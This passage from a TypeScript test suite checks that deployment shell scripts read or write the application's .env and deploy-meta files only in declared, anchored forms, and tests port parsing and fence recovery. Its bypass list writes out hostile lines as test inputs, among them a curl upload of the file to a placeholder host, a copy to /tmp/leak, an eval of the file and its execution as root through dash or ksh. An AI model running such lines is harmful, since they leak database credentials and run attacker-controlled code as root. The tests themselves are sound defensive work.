      match:
        `db_fence_publish_operator_wrappers "\\$\\{APP_USER\\}" "(${APP_OWNED_PATH})" ` +
        // o3d-secops r28: ${LOCK_FILE} joined the call, between the state file and the identity.
        // The wrappers read the fence record, ask the database about it and then write or remove
        // it, and that sequence is now excluded against every cutover and every other wrapper on
        // the entrypoint's own lock. Spelt out here for the reason the rest of this shape is: a
        // call that started passing something ELSE in that position is not covered by this.
        '"\\$\\{DB_FENCE_STATE\\}" "\\$\\{LOCK_FILE\\}" "\\$\\{DB_FENCE_IDENTITY_ARGS\\[@\\]:-\\}"' +
        '( \\|\\| echo "[^"]*" >&2)?',
    },
    // install.sh OWNS these two files: it writes them, then locks them down.
    { why: 'install.sh writing the file it owns', match: `cat > "(${APP_OWNED_PATH})" <<EOF` },
    // AND SINCE r39 IT PUBLISHES THEM BY RENAME (Codex HIGH). `cat >` truncated the application's
    // only environment file and then filled it; publish_durable_file() writes a temporary file,
    // applies ownership and mode to THAT, flushes, renames, and flushes the directory — so the
    // path never names a partial file. Spelled out in full, argument by argument, for the reason
    // db_fence_publish_operator_wrappers() is: the bytes come from `${rendered}`, a value this
    // script rendered from variables it holds, and the application-owned path appears here as a
    // DESTINATION and never as an input. A call that started piping something else into it, or
    // that dropped the ownership argument, is not covered by this.
    {
      why: 'install.sh publishing the file it owns, by rename, from bytes it rendered itself',
      match:
        `printf '%s\\\\n' "\\$\\{rendered\\}" \\| publish_durable_file "(${APP_OWNED_PATH})" ` +
        '"\\$\\{APP_USER\\}:\\$\\{APP_USER\\}" 600 \\|\\| return 1',
    },
    // The rotation journal write, which mentions the environment file only in the sentence it
    // refuses with. Its arguments are TWO PASSWORDS AND A DATABASE NAME, all BY VALUE — no path is
    // handed to it — and it is named in full so that a call passing something else is not covered.
    // The third argument arrived in r40: the endpoint the rotation proved could tell one password
    // from another, recorded so the run that reconciles asks the same place.
    {
      why: 'the rotation journal write, guarded by a refusal, handed two passwords and a database name by value',
      match:
        'write_role_rotation_journal "\\$\\{DB_PASSWORD_EFFECTIVE\\}" "\\$\\{DB_PASSWORD\\}"'
        + ' "\\$\\{DB_ROTATION_PROBE_DATABASE\\}" \\|\\| die "[^"]*"',
    },
    // AND `.deploy-meta` JOINED IT (o3d-czpy). It was `cat > "${DEPLOY_META_FILE}" <<EOF`
    // followed by a chown and a chmod 600 — three root-side operations on a name inside
    // ${APP_DIR}, which belongs to ${APP_USER} by the time an upgrade reaches that line, so a
    // symlink planted there aimed all three. It now goes through the same publisher `.env` does.
    // Spelled out in full for the same reason that one is: the bytes come from the brace group
    // immediately above, whose closing `}` opens this logical line, and the application-owned path
    // appears here as a DESTINATION and never as an input. A call that piped something else in, or
    // that dropped the ownership argument, is not covered by this.
    {
      why: 'install.sh publishing the deploy metadata it owns, by rename, from a group it composed itself',
      match:
        `\\} \\| publish_durable_file "(${APP_OWNED_PATH})" `
        + '"\\$\\{APP_USER\\}:\\$\\{APP_USER\\}" 600 \\|\\| die "[^"]*"',
    },
    {
      why: 'install.sh locking down or removing the file it owns',
      match: `(chown "\\$\\{APP_USER\\}:\\$\\{APP_USER\\}"|chmod [0-7]{3}|rm -f) "(${APP_OWNED_PATH})"`,
    },
    // The unit directive install.sh writes into the heredoc, and the cron environment path.
    { why: 'the unit directive install.sh writes', match: 'EnvironmentFile=-?\\$\\{APP_DIR\\}/\\.env' },
    // Text shown to an operator. A path inside a message is not a read — and with the hazards
    // above already applied, a message can no longer smuggle a substitution in with it.
    //
    // ONE SIMPLE COMMAND, AND ITS ARGUMENTS (o3d-2sm1.5 r28, Codex MEDIUM). r27 wrote the tail as
    // `.*`, and `.*` is not a grammar: it consumes a command separator and everything after it,
    // so `echo safe; dash "${APP_DIR}/.env"` classified as operator-facing text while executing
    // an application-owned file AS ROOT. The path scan saw the line, no hazard matched (`dash` is
    // not in the interpreter list, and no interpreter list can be complete), and the shape
    // swallowed the second command whole. Adding `dash` would have closed one spelling of an
    // unbounded family — `&&`, `|`, `&`, `;`, and every interpreter nobody has named.
    //
    // So the tail is a grammar. Each argument is a quoted string, a short option or a bare
    // variable expansion; a separator is none of those, and the anchoring does the rest.
    //
    // AND THE TRAILING `\` IS GONE FROM IT (o3d-2sm1.5 r29, Codex MEDIUM). r28 accepted one here
    // because these scripts really do continue their refusal messages onto the next line — but a
    // shape that ends in a continuation is a shape that ends in "and then whatever comes next",
    // which is how `printf … "${APP_DIR}/.env" \` + `| dash` passed. Continuations are joined
    // before anything is classified now (see logicalLines), so a logical line no longer HAS a
    // trailing backslash and there is nothing here for one to excuse.
    { why: 'operator-facing text, one simple command', match: `(die|warn|error|info|success|echo|printf)( ${MESSAGE_ARGUMENT})+( >&2)?` },
    // The same message guarded by ONE bare command — `require_db_identity || die "…"` — which is
    // what a dozen refusals in these scripts look like once their continuation is joined back on.
    // The left side is a BARE NAME with no arguments and no redirect, so nothing
    // application-owned can be handed to it; an interpreter spelled there is a hazard already.
    { why: 'a refusal guarded by one bare command', match: '[a-z_][a-z0-9_]* \\|\\| (die|warn|error) "[^"]*"( >&2)?' },
    {
      why: 'a refusal reason recorded for an operator',
      match:
        '((([A-Za-z_]+|\\*)\\) )?)(local )?(DB_IDENTITY_(SOURCE_|DRIFT_)?REASON|DB_FENCE_IDENTITY_MISMATCH|ENV_VAR_SOURCE_REASON|APP_LAYOUT_REASON|UNIT_PORT_REASON|APP_PORT_REASON|RESPONDER_REASON|description|RESUME_EVIDENCE)="[^"]*"( ;;)?',
    },
  ] as ReadonlyArray<{ why: string; match: string }>
).map((shape) => ({ why: shape.why, match: new RegExp(`^(${shape.match})$`) }))

/** The two stages, in order. Returns the reason a line is rejected, or null if it is declared. */
function classifyMention(line: string): string | null {
  const trimmed = line.trim()
  const code = shellCodeOnly(trimmed)
  for (const hazard of MENTION_HAZARDS) {
    if (hazard.match.test(hazard.where === 'line' ? trimmed : code)) return `carries ${hazard.why}`
  }
  if (!MENTION_SHAPES.some((shape) => shape.match.test(trimmed))) return 'matches no declared shape'
  return null
}

test('every mention of an application-owned file in the three entrypoints is a declared shape, whole-line', () => {
  // MUTATION ROUTE (run against this tree): put r25's line back —
  //   APP_PORT=$(grep "^APP_PORT=" "${APP_DIR}/.env" 2>/dev/null | cut -d= -f2 || echo "3000")
  // — anywhere in update.sh and this test fails printing that exact line under update.sh, now as
  // a HAZARD (a command substitution that is not the one reader) rather than as an unmatched
  // shape. Its quoted twin fails identically.
  for (const entry of R9_SCRIPTS) {
    const unclassified = appOwnedFileMentions(entry.source)
      .map((line) => ({ line, why: classifyMention(line) }))
      .filter((entry_) => entry_.why !== null)
      .map((entry_) => `${entry_.why}: ${entry_.line.trim()}`)
    assert.deepEqual(
      unclassified,
      [],
      `${entry.name} touches an application-owned file in a way nothing declares. Either route it through env_file_value() or add the shape to MENTION_SHAPES with a reason:\n${unclassified.join('\n')}`,
    )
  }

  // PRECONDITION, so the enumeration cannot pass by matching nothing: each script really does
  // mention those files, and update.sh's mentions include the reads this round moved into it.
  for (const entry of R9_SCRIPTS) {
    assert.ok(appOwnedFileMentions(entry.source).length > 10, `${entry.name}: the scan found almost no mentions, so it is not scanning`)
  }
  assert.ok(
    UPDATE_LINES.some((line) => /^ENV_FILE_APP_PORT="\$\(env_file_value APP_PORT "\$\{APP_DIR\}\/\.env"\)"$/.test(line)),
    'update.sh must read .env\'s APP_PORT claim through the one reader',
  )
})

/**
 * THE BYPASSES, NAMED AND REQUIRED TO FAIL (o3d-2sm1.5 r27, Codex MEDIUM).
 *
 * A guard is only worth what it rejects, and r26's rejected none of these while reporting a clean
 * build. Each line below is fed through the SHIPPED classifier — the same two stages the scan
 * above runs — and each must come back rejected. A guard change that reopens any one of them
 * fails here, naming the line.
 */
const MENTION_BYPASSES: ReadonlyArray<{ label: string; line: string }> = [
  { label: 'a file test that also executes the file', line: '[[ -f "${APP_DIR}/.env" ]] && bash "${APP_DIR}/.env"' },
  { label: 'an execution wrapped in operator-facing text', line: 'echo "$(bash "${APP_DIR}/.env")"' },
  { label: 'a second reader excused by an inline comment', line: 'APP_PORT=$(grep "^APP_PORT=" "${APP_DIR}/.env" | cut -d= -f2)  # env_file_value ' },
  { label: 'r25\'s exact second reader', line: 'APP_PORT=$(grep "^APP_PORT=" "${APP_DIR}/.env" 2>/dev/null | cut -d= -f2 || echo "3000")' },
  { label: 'the same read with the quotes r25 looked for', line: 'APP_PORT="$(grep "^APP_PORT=" "${APP_DIR}/.env" | cut -d= -f2)"' },
  { label: 'the unbraced path spelling', line: 'cat $APP_DIR/.env' },
  { label: 'the unbraced path spelling, sourced', line: 'source $APP_DIR/.env' },
  { label: 'a source hidden after a shape that matches', line: 'DEPLOY_META_FILE="${APP_DIR}/.deploy-meta"; . "${DEPLOY_META_FILE}"' },
  { label: 'a backtick substitution inside a message', line: 'die "the file ${APP_DIR}/.env said `cat "${APP_DIR}/.env"`"' },
  { label: 'a redirect that reads the file', line: 'while read -r line; do :; done < "${APP_DIR}/.env"' },
  { label: 'a process substitution', line: 'diff <(cat "${APP_DIR}/.env") /dev/null' },
  { label: 'an eval of the file contents', line: 'eval "$(cat "${APP_DIR}/.env")"' },
  { label: 'a trailing execution after a legitimate reader', line: 'DATABASE_URL="$(env_file_value DATABASE_URL "${APP_DIR}/.env")"; bash "${APP_DIR}/.env"' },
  // The three below carry NO hazard at all — `curl`, `chmod` and `cp` are not interpreters and
  // there is no substitution or redirect in any of them. Each is caught by the ANCHORING alone:
  // unanchored, each fragment-matches a shape the scripts really do use (a path assignment, a
  // lockdown, the one reader) and the rest of the compound command is never looked at. They are
  // what makes `^…$` load-bearing rather than decorative.
  { label: 'a path assignment with the file exfiltrated after it', line: 'DEPLOY_META_FILE="${APP_DIR}/.deploy-meta" && curl -T "${DEPLOY_META_FILE}" https://example.invalid' },
  { label: 'a file test that then loosens the file mode', line: '[[ -f "${APP_DIR}/.env" ]] && chmod 644 "${APP_DIR}/.env"' },
  { label: 'the one reader with a copy of the file appended', line: 'DATABASE_URL="$(env_file_value DATABASE_URL "${APP_DIR}/.env")" && cp "${APP_DIR}/.env" /tmp/leak' },
  // r27's THIRD escape from the operator-message shape, and the reason its tail is a grammar now
  // rather than a longer list of interpreter names: NEITHER of these carries a hazard. `dash` and
  // `tclsh` are absent from MENTION_HAZARDS — as any finite list of interpreters always will be —
  // and each line's first command really is operator-facing text. Only "exactly one simple
  // command" rejects them.
  { label: 'a message with a second command after a semicolon', line: 'echo safe; dash "${APP_DIR}/.env"' },
  { label: 'a message with a second command after &&', line: 'warn "checked" && tclsh "${APP_DIR}/.deploy-meta"' },
  { label: 'a message piped into an interpreter nobody listed', line: 'echo "${APP_DIR}/.env" | ksh' },
  // r28's FOURTH escape, and the one that says what the others had in common: the guard read
  // PHYSICAL lines and bash reads LOGICAL ones. The first line here was accepted as
  // operator-facing text — the shape explicitly allowed a trailing backslash — and the second was
  // never classified at all, because it names no application-owned path and the scan therefore
  // never looks at it. Together they are ONE pipeline that sources the file as root.
  {
    label: 'a message continued onto a line that pipes it into an interpreter',
    line: 'printf \'. %s\\n\' "${APP_DIR}/.env" \\\n  | dash',
  },
  // The same mechanism without a pipe: the continuation carries a second command with it.
  {
    label: 'a path assignment continued onto a line that executes the file',
    line: 'DEPLOY_META_FILE="${APP_DIR}/.deploy-meta" \\\n  && bash "${DEPLOY_META_FILE}"',
  },
  // And the escaped backslash, which is NOT a continuation: `\\` at the end of a line is a
  // literal backslash, so this line stands alone and must be rejected on its own terms. It is
  // here so that "join anything ending in a backslash" is not what passes this corpus.
  { label: 'a line ending in an escaped backslash, not a continuation', line: 'cat "${APP_DIR}/.env" \\\\' },
]

test('the declared-shape guard rejects every known way past it', () => {
  // MUTATION ROUTE, each verified by making the change locally and re-running:
  //   drop the `^…$` anchoring from MENTION_SHAPES (match anywhere on the line, which is exactly
  //     what r26 did) and the last three cases pass classification — they carry no hazard, so
  //     the anchoring is the only thing rejecting them;
  //   drop MENTION_HAZARDS and the substitution, interpreter, redirect and backtick cases pass;
  //   narrow APP_OWNED_PATH back to the braced spellings and the two unbraced cases are not even
  //     seen by the scan;
  //   make logicalLines() return source.split(/\r?\n/) unchanged — which is what r28 classified —
  //     and the two continuation cases pass: the first physical line of each matches a shape (with
  //     r28's trailing-backslash tail restored) and the second is never scanned at all.
  // THROUGH THE WHOLE PIPELINE, NOT JUST THE CLASSIFIER (o3d-2sm1.5 r29, Codex MEDIUM). A bypass
  // that spans two physical lines is not a `line` any more, and feeding it to classifyMention()
  // directly would test the classifier while skipping the joining that is the actual fix — and
  // skipping the scan, which is where the second physical line used to disappear. Each entry goes
  // in as SOURCE: it is joined into logical lines, scanned for an application-owned path, and
  // every logical line the scan returns is classified. A bypass counts as caught only if the scan
  // saw something and the classifier rejected it; a bypass the scan does not see at all is the
  // r28 failure exactly, and counts as ACCEPTED.
  const accepted = MENTION_BYPASSES.filter((bypass) => {
    const seen = appOwnedFileMentions(bypass.line)
    return seen.length === 0 || seen.every((line) => classifyMention(line) === null)
  }).map((bypass) => `${bypass.label}: ${bypass.line}`)
  assert.deepEqual(accepted, [], `the guard accepts lines that read or execute an application-owned file:\n${accepted.join('\n')}`)

  // PRECONDITION, so the rejections above are not the classifier rejecting everything: the real
  // shapes the scripts use are still accepted, and the scan sees the unbraced spelling it missed.
  for (const line of [
    'DATABASE_URL="$(env_file_value DATABASE_URL "${APP_DIR}/.env")"',
    'DEPLOY_META_FILE="${APP_DIR}/.deploy-meta"',
    '[[ -f "${APP_DIR}/.env" ]] || die ".env not found. Run install.sh first."',
    'chmod 600 "${APP_DIR}/.env"',
  ]) {
    assert.equal(classifyMention(line), null, `the guard must still accept the shapes the scripts use: ${line}`)
  }
  assert.deepEqual(
    appOwnedFileMentions('cat $APP_DIR/.env\nsource $APP_DIR/.deploy-meta\n'),
    ['cat $APP_DIR/.env', 'source $APP_DIR/.deploy-meta'],
    'the scan must see the unbraced path spelling r26 was blind to',
  )

  // AND THE JOINING IS REAL, in both directions: a continuation becomes ONE logical line, and an
  // escaped backslash at the end of a line does not join anything. Without this the corpus above
  // could pass on a joiner that joined every line to the next, which would reject everything.
  assert.deepEqual(
    logicalLines('die "one" \\\n  "two"\nnext_command\n'),
    ['die "one" "two"', 'next_command', ''],
    'a trailing backslash must join the next physical line onto this one',
  )
  assert.deepEqual(
    logicalLines('printf "%s" "a\\\\"\nnext_command\n'),
    ['printf "%s" "a\\\\"', 'next_command', ''],
    'an even number of trailing backslashes is an escaped backslash, not a continuation',
  )
  assert.deepEqual(
    logicalLines('# a comment ending in a backslash \\\ncat "${APP_DIR}/.env"\n'),
    ['# a comment ending in a backslash \\', 'cat "${APP_DIR}/.env"', ''],
    'a comment must not swallow the code line beneath it',
  )
})

// ---------------------------------------------------------------------------
// THE PORT, RUN FOR REAL (o3d-2sm1.5 r26/r27, Codex HIGH).
//
// r26 proved the READER gets the right answer out of .env for the value shapes dotenv accepts.
// r27's finding is that the right answer out of that file is still the wrong answer to the
// question: ${APP_DIR}/.env is application-writable and nothing in it starts the service, so a
// perfectly well-formed APP_PORT can name a port ${SERVICE_UNIT} never binds — and the listener
// probe, the health poll and the build-id proof would then all confirm a different process, or
// none. So these say three things: the reader still parses the file correctly (that claim about
// .env's own contents has not gone away, it has been demoted to a cross-check), the port the
// script POLLS comes from the unit, and the socket that answers is shown to be the unit's.
// ---------------------------------------------------------------------------
const APP_PORT_CASES: ReadonlyArray<{ label: string; env: string; port: string; wasWrongBefore: string }> = [
  {
    label: 'quoted',
    env: 'APP_PORT="8080"\n',
    port: '8080',
    wasWrongBefore: 'grep|cut kept the quotes: http://127.0.0.1:"8080"/api/health',
  },
  {
    label: 'a trailing comment',
    env: 'APP_PORT=8080  # the internal port\n',
    port: '8080',
    wasWrongBefore: 'grep|cut kept the comment, and the URL then word-split across three curl arguments',
  },
  {
    label: 'quoted AND commented',
    env: 'APP_PORT="8080" # the internal port\n',
    port: '8080',
    wasWrongBefore: 'both at once',
  },
  {
    label: 'exported',
    env: 'export APP_PORT=8080\n',
    port: '8080',
    wasWrongBefore: 'grep "^APP_PORT=" did not match the line at all, so the value read as empty',
  },
  {
    label: 'defined twice',
    env: 'APP_PORT=3000\nAPP_PORT=8080\n',
    port: '8080',
    wasWrongBefore: 'grep took the FIRST line; dotenv and the service take the last',
  },
  {
    label: 'absent',
    env: '',
    port: '',
    wasWrongBefore: 'the `|| echo "3000"` never fired — a pipeline’s status is `cut`’s, and `cut` succeeds on empty input — so the port read as EMPTY while the code claimed 3000',
  },
]

for (const scenario of APP_PORT_CASES) {
  test(`update.sh reads .env's APP_PORT claim correctly when it is ${scenario.label}`, () => {
    // The claim is still read exactly, because it is still CHECKED against the unit — a
    // cross-check that misparses the file raises a mismatch over a file that agrees.
    //
    // MUTATION ROUTE: replace the preflight read with r25's
    //   ENV_FILE_APP_PORT=$(grep "^APP_PORT=" "${APP_DIR}/.env" 2>/dev/null | cut -d= -f2)
    // and the quoted, commented, quoted+commented, exported and defined-twice cases all report a
    // different value — verified by running exactly that against this harness.
    const dir = mkdtempSync(join(tmpdir(), 'ims-appport-'))
    try {
      writeFileSync(join(dir, '.env'), `DATABASE_URL=postgresql://app:pw@127.0.0.1:5432/ims\n${scenario.env}`)
      const result = runUpdatePrelude(dir, ['ENV_FILE_APP_PORT', 'APP_PORT'])
      assert.equal(result.status, 0, `the prelude must run cleanly:\n${result.output}`)
      // PRECONDITION: the prelude really reached this .env, so the value below is a read value.
      assert.match(result.output, /^ENV_FILE_APP_PORT=/m, 'precondition: the prelude reported the claim at all')
      assert.match(
        result.output,
        new RegExp(`^ENV_FILE_APP_PORT=${scenario.port}$`, 'm'),
        `${scenario.label}: ${scenario.wasWrongBefore}\n${result.output}`,
      )
      // AND THE FILE DOES NOT DECIDE THE PORT (r27, Codex HIGH). Whatever it says, APP_PORT is
      // still empty at the end of initialisation: it is resolved from the unit, under the
      // cutover lock, further down.
      assert.match(
        result.output,
        /^APP_PORT=$/m,
        `${scenario.label}: .env must not be able to set the port the health check polls:\n${result.output}`,
      )
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
}

// ---------------------------------------------------------------------------
// THE .env REFUSAL THAT USED TO ABANDON A FENCE (o3d-2sm1.5 r28, Codex HIGH).
//
// `[[ -f "${APP_DIR}/.env" ]] || die` sat in top-level initialisation — before the EXIT trap,
// before the cutover lock and before marker adoption — and refused on a path the APPLICATION USER
// OWNS. After an interrupted migration that account could delete the file and the recovery run
// walked out: service left stopped, reboot fence left standing, crontab left commented out,
// connection fence left un-adopted, and no trap installed to say any of it. The same shape r27
// moved for the port, two lines above it, left in place for a year.
//
// Two things are proven here, and they are different claims: initialisation no longer aborts,
// and the ADOPTION STILL RUNS before the refusal does.
// ---------------------------------------------------------------------------

/** The layout gate, lifted out of update.sh verbatim by its own condition. */
function layoutGate(source: string): string {
  const lines = source.split(/\r?\n/)
  const start = lines.findIndex((line) => /^if \[\[ -n "\$\{APP_LAYOUT_REASON\}" \]\]; then$/.test(line))
  assert.notEqual(start, -1, 'the layout refusal must still be a top-level gate of its own')
  let end = start
  while (end < lines.length && lines[end] !== 'fi') end += 1
  assert.ok(end < lines.length, 'the layout gate must be closed by a fi in column 0')
  return lines.slice(start, end + 1).join('\n')
}

/**
 * update.sh's REAL prelude, its REAL adoption block and its REAL layout gate, in that order,
 * against a real ${APP_DIR} and a real fence marker on disk.
 *
 * Only two things are synthetic. `--dry-run` is what lets the prelude run unprivileged (the root
 * check is `$EUID -ne 0 && ! $DRY_RUN`, and EUID is read-only in bash), and DRY_RUN is put back to
 * false immediately afterwards so the adoption block takes the REAL path rather than printing what
 * it would do — that is exactly the substitution "run this as root" would make. Everything the
 * adoption then calls that reaches systemd, cron or a database is stubbed into ${LOG}; the ORDER
 * of those calls, which is the whole finding, is the shipped code's.
 */
function runLayoutGate(options: { env: string | null; marker: string | null }): {
  status: number
  output: string
  log: string
} {
  const dir = mkdtempSync(join(tmpdir(), 'ims-layout-'))
  const state = mkdtempSync(join(tmpdir(), 'ims-layout-state-'))
  try {
    if (options.env !== null) writeFileSync(join(dir, '.env'), options.env)
    // THE MARKER LIVES UNDER A ROOT-OWNED LITERAL NOW (o3d-secops r20), and this harness runs the
    // REAL prelude, unprivileged, so it cannot write there. The literal is substituted for a
    // directory of this run's own — asserted present first, so a rename of the constant cannot
    // leave this quietly measuring an adoption that never had a marker to find. That it is a
    // literal rather than an ${IMS_*} override is asserted by the namespace test above, which is
    // where that claim belongs.
    const markerDir = join(state, 'marker-dir')
    mkdirSync(markerDir)
    if (options.marker !== null) writeFileSync(join(markerDir, 'DEPLOY-FENCED'), options.marker)
    const log = join(state, 'calls.log')
    const source = UPDATE_LINES.join('\n')
    const program = [
      redirectFenceMarkerDir(preludeThrough(UPDATE_LINES, /^DB_OBJECT_ACCESS_SCRIPT=/), markerDir),
      `LOG=${JSON.stringify(log)}`,
      ': > "${LOG}"',
      'DRY_RUN=false',
      // Everything below reaches systemd, cron, /etc or a database. None of it is the subject.
      'systemctl(){ echo "systemctl $*" >> "${LOG}"; return 0; }',
      'ss(){ return 1; }',
      'install_reboot_fence(){ echo "install_reboot_fence" >> "${LOG}"; REBOOT_FENCE_INSTALLED=true; return 0; }',
      'remove_reboot_fence(){ echo "remove_reboot_fence" >> "${LOG}"; return 0; }',
      'adopt_cron_fence(){ echo "adopt_cron_fence" >> "${LOG}"; CRON_FENCED=true; return 0; }',
      'adopt_db_connections(){ echo "adopt_db_connections" >> "${LOG}"; DB_FENCE_UP=true; return 0; }',
      'release_db_connections(){ echo "release_db_connections" >> "${LOG}"; DB_FENCE_UP=false; return 0; }',
      'resume_from_interrupted_arming(){ echo "resume_from_interrupted_arming" >> "${LOG}"; return 0; }',
      // o3d-2sm1.5 r30: where the adoption's identity comes from, and the refusal when the record
      // and .env disagree. Both are defined further down update.sh than this prelude reaches, and
      // neither is the subject here — this harness is about the layout gate coming AFTER the
      // adoption. They are exercised against real files in the recovery tests below.
      'require_adoption_identity(){ echo "require_adoption_identity" >> "${LOG}"; return 0; }',
      'refuse_adoption_identity_mismatch(){ echo "refuse_adoption_identity_mismatch $*" >> "${LOG}"; return 0; }',
      // o3d-secops r20: adoption asks whether the marker is one this run may believe before it
      // reads a line of it. Lifted rather than stubbed, for the reason everything else here is.
      shellFunction(source, 'fence_marker_is_trustworthy'),
      shellFunction(source, 'marker_is_complete'),
      shellFunction(source, 'marker_phase'),
      shellFunction(source, 'predecessor_is_active'),
      adoptionBlock(source),
      layoutGate(source),
      'echo "PAST_THE_GATE=yes"',
    ].join('\n')
    const result = runShell(
      layoutInvocation(program, `IMS_APP_DIR=${JSON.stringify(dir)} IMS_CUTOVER_STATE_DIR=${JSON.stringify(state)}`),
    )
    // A run that never reached the stubs leaves no log at all — which is precisely what the
    // mutation route below produces — so an absent log is an EMPTY log and not a harness error.
    return { ...result, log: existsSync(log) ? readFileSync(log, 'utf8') : '' }
  } finally {
    rmSync(dir, { recursive: true, force: true })
    rmSync(state, { recursive: true, force: true })
  }
}

/**
 * Run one of these lifted programs from a FILE whose sibling `lib` is the repository's, rather
 * than from stdin (o3d-2sm1.5 r31).
 *
 * update.sh sources scripts/lib/db-fence-protected.sh through ${BASH_SOURCE[0]} — which is how it
 * reaches the copy that shipped beside it rather than one under an application-writable directory
 * — and a script bash reads from stdin has no BASH_SOURCE path at all. The alternative would be
 * an IMS_* override for the library path, i.e. a variable that chooses which code root executes,
 * which is the class of thing this round exists to close.
 */
function layoutInvocation(program: string, env: string): string {
  // From the shared helper, not `mkdtempSync`, because this function RETURNS A COMMAND STRING: the
  // staging directory has to outlive the call that made it, so there is no scope here in which to
  // remove it. `createTempDirSync` registers the removal at the moment of creation instead
  // (o3d-tmpleak) — this was the one site in tests/scripts/ that actually leaked.
  const stage = createTempDirSync('ims-staged-')
  symlinkSync(join(process.cwd(), 'scripts/lib'), join(stage, 'lib'))
  const script = join(stage, 'lifted.sh')
  writeFileSync(script, `${program}\n`)
  return `${env} bash ${JSON.stringify(script)} --dry-run`
}

/** The shipped literal, and where a harness that cannot write /etc puts it instead. */
function redirectFenceMarkerDir(program: string, dir: string): string {
  const shipped = 'readonly FENCE_MARKER_DIR="/etc/ims-cutover"'
  assert.equal(program.split(shipped).length - 1, 1,
    `precondition: the lifted prelude must carry the marker directory literal:\n${shipped}`)
  return program.replace(shipped, `readonly FENCE_MARKER_DIR=${JSON.stringify(dir)}`)
}

/** What an interrupted run that had already begun migrating leaves behind. */
const MIGRATING_MARKER = [
  'phase=stopping',
  'migration_attempted=true',
  'schema_touched=true',
  'reason=interrupted',
  'marker_complete=1',
  '',
].join('\n')

test('a deleted .env does not make a recovery run abandon a standing fence', () => {
  // THE LOAD-BEARING CASE. The marker says a previous run had begun migrating, and the
  // application-owned .env is GONE — which is the state the application account can produce at
  // will, and the exact one where walking away is most expensive.
  //
  // MUTATION ROUTE (verified by making the change locally and re-running): put the old line back
  // beside the read in update.sh —
  //   [[ -f "${APP_DIR}/.env" ]] || die ".env not found. Run install.sh first."
  // — and the log below is EMPTY: no stop, no reboot fence, no connection fence, because the run
  // exited during initialisation. Every assertion about the log fails, and it fails for the right
  // reason: the prelude died before the adoption block was ever reached.
  const gone = runLayoutGate({ env: null, marker: MIGRATING_MARKER })

  // The adoption happened, in full, and it happened FIRST.
  assert.match(gone.log, /systemctl stop/, `the service must be re-stopped before anything is refused:\n${gone.log}`)
  assert.match(gone.log, /install_reboot_fence/, `and the reboot fence re-established:\n${gone.log}`)
  assert.match(gone.log, /adopt_cron_fence/, `and the cron fence confirmed:\n${gone.log}`)
  assert.match(gone.log, /adopt_db_connections/, `and a fence over a touched schema HELD, not released:\n${gone.log}`)
  assert.ok(!/release_db_connections/.test(gone.log), `and never released over a schema that may be half applied:\n${gone.log}`)
  const stopAt = gone.log.indexOf('systemctl stop')
  const fenceAt = gone.log.indexOf('install_reboot_fence')
  assert.ok(stopAt !== -1 && fenceAt !== -1 && stopAt < fenceAt, `the stop comes before the re-fence:\n${gone.log}`)

  // And THEN the refusal, which is a refusal and not a shrug.
  assert.notEqual(gone.status, 0, `a run with no .env must still refuse:\n${gone.output}`)
  assert.ok(!/PAST_THE_GATE/.test(gone.output), 'and it must not fall through the gate')
  assert.match(gone.output, /cannot read the application's own configuration/, `and say why:\n${gone.output}`)
  assert.match(gone.output, /does not exist/, 'naming what is wrong with the file')
  assert.match(gone.output, /has just been ADOPTED above/, 'and telling the operator what state the box is in')

  // THE CONTROL, so none of the above is the harness stopping everything: the same run with the
  // file present adopts identically and walks PAST the gate.
  const present = runLayoutGate({
    env: 'DATABASE_URL=postgresql://app:pw@127.0.0.1:5432/ims\n',
    marker: MIGRATING_MARKER,
  })
  assert.equal(present.status, 0, `with the file present the gate must let the run continue:\n${present.output}`)
  assert.match(present.output, /PAST_THE_GATE=yes/, 'and reach what comes after it')
  assert.match(present.log, /systemctl stop/, 'having adopted the same fence')
})

// ---------------------------------------------------------------------------
// THE ADOPTION THAT USED TO NEED THE FILE IT RECOVERS FROM (o3d-2sm1.5 r29, Codex HIGH).
//
// r28 moved the .env refusal BELOW the adoption, so a deleted ${APP_DIR}/.env could no longer
// make a recovery run walk away from a standing fence. The refusal was then in the right place
// and the ADOPTION ITSELF still depended on the missing file: with .env gone, DATABASE_URL is
// empty, DB_FENCE_IDENTITY_ARGS is empty, and adopt_db_connections() reached
// fence_db_connections() only to die on "the connection identity could not be read". The service
// and reboot fences were restored; the standing DATABASE fence was neither re-applied nor
// re-drained. The r28 test did not catch it because it replaced adopt_db_connections() with an
// unconditional success.
//
// A RECOVERY PATH MAY NOT DEPEND ON THE THING WHOSE LOSS IT RECOVERS FROM. Two application-owned
// dependencies are removed here and both are exercised below, in one round trip:
//
//   the four identity values   now recorded, when the fence is RAISED, in a root-owned file
//   the fence script itself    ${APP_DIR}/scripts/fence-db-connections.mjs, copied beside it
//
// and the third input — DEPLOY_ADMIN_DATABASE_URL, a credential no record may hold — comes from
// the root invocation, with a refusal that names it.
//
// NOTHING BELOW IS STUBBED THAT IS PART OF THE CLAIM. The shipped fence_db_connections(),
// adopt_db_connections(), require_adoption_identity(), adopt_identity_from_recovery_record(),
// db_fence_script_in_use(), publish_fence_recovery_record(), resolve_db_identity() and
// env_file_value() all run, against real files. The record the recovery reads is the one the
// FENCE wrote, in the same test, rather than bytes typed here.
// ---------------------------------------------------------------------------

/**
 * Put a protected artefact in place THE WAY THE SHIPPED LIBRARY DOES (o3d-2sm1.5 r32).
 *
 * Several tests below need a protected copy that this run did not publish — a fence raised by an
 * earlier run, which is the whole premise of the recovery path. Before r32 that was two lines of
 * mkdir and writeFileSync. It cannot be any more: the artefact now carries a vendored dependency
 * closure and a record of what the tree hashes to, and a test that wrote those by hand would be
 * a second implementation of the digest — the "one rule, several readers" shape that produced the
 * last three findings. So the library publishes it, from a throwaway checkout, exactly as a
 * previous cutover would have.
 */
function plantProtectedArtefact(recovery: string, helperBody: string): void {
  const seed = mkdtempSync(join(tmpdir(), 'ims-seed-'))
  try {
    writeFenceCheckout(seed, helperBody)
    const result = runShell(
      [
        'set -uo pipefail',
        'exec 2>&1',
        ...protectedLibraryLinesAt(recovery),
        `DB_FENCE_SCRIPT=${JSON.stringify(checkoutHelper(seed))}`,
        'chown(){ :; }',
        'publish_fence_script_copy || { echo "PLANT FAILED: ${DB_FENCE_ROTATION_NOTE}"; exit 1; }',
      ].join('\n'),
    )
    assert.equal(result.status, 0, `the previous run's artefact must be publishable:\n${result.output}`)
  } finally {
    rmSync(seed, { recursive: true, force: true })
  }
}

/** Everything the connection fence and its adoption touch, wired to real directories. */
function fenceRecoveryHarness(dirs: { app: string; state: string; recovery: string }, body: string[]): string {
  const source = UPDATE_LINES.join('\n')
  return [
